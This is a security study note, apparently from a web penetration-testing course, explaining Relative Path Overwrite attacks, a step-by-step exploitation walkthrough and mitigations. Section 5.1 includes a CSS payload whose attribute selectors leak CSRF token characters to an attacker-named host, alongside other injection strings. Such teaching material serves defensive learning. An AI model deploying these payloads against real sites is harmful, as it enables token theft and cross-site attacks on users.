---
tags: [web-exploitation, advanced, vapt]
difficulty: advanced
module: "58 - Advanced Web Techniques"
topic: "58.06 Relative Path Overwrite RPO"
---

# Relative Path Overwrite (RPO)

## 1. Introduction to Relative Path Overwrite (RPO)
Relative Path Overwrite (RPO) is an advanced web vulnerability that occurs when a web application utilizes relative paths for importing resources (such as CSS, JavaScript, or images) and incorrectly handles specific URL structures or path normalization discrepancies between the web browser and the web server.

The vulnerability stems from the fundamental difference in how web browsers and web servers interpret the requested URL path. Browsers construct the absolute URL for a relative resource based on the current URL they perceive, while the server might interpret the requested path differently, often serving the same dynamically generated page for variations of a URL. This semantic gap allows an attacker to manipulate the browser's base path context, forcing it to fetch resources from unintended server endpoints that the attacker controls or can influence.

## 2. The Core Concept and Path Normalization
When an application uses a relative URL like `<link href="styles/main.css" rel="stylesheet">`, the browser determines the full URL by appending "styles/main.css" to the base URI of the current document. If the current URL is `http://example.com/app/index.php`, the browser fetches `http://example.com/app/styles/main.css`.

However, if the server routes URLs based on PATH_INFO or uses a front-controller pattern (common in modern frameworks), a request to `http://example.com/app/index.php/attacker-injected-path/` might still be processed by `index.php`. The browser, seeing `/attacker-injected-path/` as a directory, will now attempt to resolve relative resources from that "directory."

If the attacker can inject their own content into the page (even if sanitized against XSS), they might be able to trick the browser into loading that injected content as a stylesheet or script, bypassing traditional XSS filters.

## 3. ASCII Architecture Diagram
```text
[ Browser Context ]                                   [ Server Context ]
                                                              
URL Requested by Victim:                             Server sees:
http://example.com/profile/index.php/dummy/          index.php handles the request
                                                     (ignores /dummy/)
            |                                                 |
            | HTML Response:                                  |
            | <link rel="stylesheet" href="style.css">        |
            | (Contains attacker's injected text:             |
            |  {} body { background: red; } /* )              |
            v                                                 v
Browser resolves relative path:                      Server receives request for:
http://example.com/profile/index.php/dummy/style.css -> http://example.com/profile/index.php/dummy/style.css
                                                              
                                                     Server routing logic kicks in:
                                                     Treats 'style.css' as a parameter or ignores it.
                                                     Returns index.php again!
                                                     (But now browser treats the HTML as CSS)
```

## 4. Detailed Vulnerability Mechanics

### 4.1 Browser Resolution Behavior
Web browsers follow RFC 3986 for resolving relative references. The base URI is determined by the URL of the document or the `<base>` tag if present. Crucially, the browser considers everything up to the last slash `/` as the base path.
- Document URL: `http://website.com/user/profile` -> Base: `http://website.com/user/`
- Document URL: `http://website.com/user/profile/` -> Base: `http://website.com/user/profile/`
- Document URL: `http://website.com/user/profile/foo/bar/` -> Base: `http://website.com/user/profile/foo/bar/`

### 4.2 Server Routing Behavior
Web frameworks (like Django, Ruby on Rails, or Spring) and PHP applications often use URL rewriting. A URL like `http://website.com/user/profile/123/` is typically routed to a handler for the user profile, taking `123` as a parameter.
If the application is excessively permissive, appending arbitrary path segments (e.g., `http://website.com/user/profile/123/this/is/ignored/`) might still render the same profile page.

### 4.3 The Intersection
When these two behaviors intersect, RPO arises:
1. The server renders the page for a manipulated URL (e.g., `/user/profile/123/ignored/`).
2. The page contains relative links: `<script src="app.js"></script>`.
3. The browser fetches `/user/profile/123/ignored/app.js`.
4. The server receives the request for `/user/profile/123/ignored/app.js`. Because of its permissive routing, it might serve the default `profile` page HTML instead of a real JS file.
5. If the attacker can control some text on that `profile` page (e.g., user biography), and if the browser executes it as JavaScript, it results in Cross-Site Scripting (XSS).

## 5. Exploitation Scenarios and Vectors

### 5.1 CSS Injection (Style Injection)
CSS injection is the most common consequence of RPO. Even if the attacker cannot inject executable JavaScript directly, they might be able to inject CSS rules. In the past, browsers were more lenient with CSS parsing, entering "quirks mode" and ignoring invalid HTML content around valid CSS rules.
An attacker could inject `{} body { background: red; } /*` into their profile. When the browser loads the profile page as a CSS file, it parses the injected CSS, potentially allowing data exfiltration via CSS attributes (e.g., reading CSRF tokens using attribute selectors).

Example CSS Injection Payload for Data Exfiltration:
```css
{}
input[name="csrf_token"][value^="a"] { background: url('http://attacker.com/log?token=a'); }
input[name="csrf_token"][value^="b"] { background: url('http://attacker.com/log?token=b'); }
/*
```

### 5.2 JavaScript Execution
Modern browsers use strict MIME-type checking (e.g., `X-Content-Type-Options: nosniff`). If this header is present, the browser will refuse to execute a file as JavaScript if its Content-Type is `text/html`.
However, if the `nosniff` header is missing, the browser might sniff the content and execute it as JS, leading to full XSS. The attacker's payload `alert(1)` in the profile would be executed when the profile page is loaded in the `<script src="...">` context.

### 5.3 DOM-based Vulnerabilities
Sometimes the application uses JavaScript to process the URL. If the URL is tampered with via an RPO attack, DOM-based XSS can occur. For instance, if JS extracts a path segment assuming a specific structure, the injected path layers might confuse the logic.

## 6. Exploitation Walkthrough

### Step 1: Identifying Discrepancies
Send requests with appended path segments:
- `GET /vulnerable-page` (200 OK)
- `GET /vulnerable-page/` (200 OK)
- `GET /vulnerable-page/foo/bar/` (200 OK)
If all return the same content, the server is lenient.

### Step 2: Checking for Relative Paths
Inspect the page source of the response for relative paths:
```html
<html>
<head>
    <link href="css/theme.css" rel="stylesheet">
</head>
<body>...</body>
</html>
```
Notice the lack of a leading slash.

### Step 3: Testing Payload Reflection
Inject a payload into a field reflected on the page. For CSS injection:
`{} * { background-color: red !important; }`
Ensure the application reflects this string without encoding that breaks CSS syntax.

### Step 4: Crafting the RPO Link
Construct the URL to force the browser to request the vulnerable page as the resource:
`http://vulnerable.com/vulnerable-page/foo/bar/`
The browser resolves `css/theme.css` to `http://vulnerable.com/vulnerable-page/foo/bar/css/theme.css`.

### Step 5: Execution
When the victim visits the crafted link, their browser fetches the CSS from the invalid path. The server serves the HTML page containing the injected CSS payload. The browser, if susceptible to quirks mode or lacking `nosniff`, applies the attacker's CSS.

## 7. The Role of Quirks Mode
In older implementations, browsers in Quirks Mode would ignore HTML tags and process any valid CSS syntax found within the document. This made RPO trivial for CSS injection. Modern HTML5 (`<!DOCTYPE html>`) enforces standards mode, which is stricter, but missing DOCTYPEs or specific browser edge cases can still lead to exploitation.
To force quirks mode, an attacker might look for pages missing the HTML5 DOCTYPE declaration.

## 8. Mitigation and Defense

### 8.1 Use Absolute Paths
Always use absolute paths for static resources. Prefix resource paths with a forward slash `/` to anchor them to the web root.
**Vulnerable:** `<script src="js/app.js"></script>`
**Secure:** `<script src="/js/app.js"></script>`
Or use absolute URLs: `<script src="https://cdn.example.com/js/app.js"></script>`

### 8.2 Implement the `<base>` Tag
If relative paths must be used, define a base URI in the `<head>` of the HTML document. This tells the browser exactly how to resolve relative links, ignoring the current URL path.
```html
<base href="https://example.com/">
```

### 8.3 Strict Content-Type Options
Always send the `X-Content-Type-Options: nosniff` HTTP response header. This prevents the browser from MIME-sniffing and executing HTML pages as CSS or JavaScript, effectively neutralizing most direct RPO exploits.
**Nginx Configuration:**
```nginx
add_header X-Content-Type-Options "nosniff" always;
```

### 8.4 Strict Routing and Error Handling
Configure the web framework or reverse proxy to strictly match URLs. Return a 404 Not Found error for requests that append unexpected path segments instead of silently routing them to the base handler.

## 9. Advanced Considerations: Web Cache Poisoning via RPO
In sophisticated setups, RPO can be combined with web caching. If the attacker can get the cache to store the malicious "resource" response (the HTML page rendered as CSS), subsequent legitimate users requesting the actual resource might receive the cached malicious version.
This requires the attacker to send the RPO request, force the cache to save the response mapped to the legitimate CSS path, and then wait for victims to load the site.

## 10. Summary
RPO is a subtle but powerful vulnerability that highlights the importance of consistency between frontend resource loading and backend routing logic. Proper URL normalization, strict MIME types, and absolute pathing are non-negotiable for secure web applications.

## Chaining Opportunities
- **[[15 - Web Cache Poisoning]]**: RPO can manipulate caching keys or cache rules.
- **[[04 - Cross-Site Scripting XSS]]**: RPO is primarily a vector to achieve XSS or CSS injection.
- **[[12 - Client-Side Path Traversal]]**: Combining RPO with client-side path manipulation.

## Related Notes
- [[01 - URL Normalization Issues]]
- [[03 - HTTP Header Injection]]
- [[09 - Host Override via Forwarded Headers]]
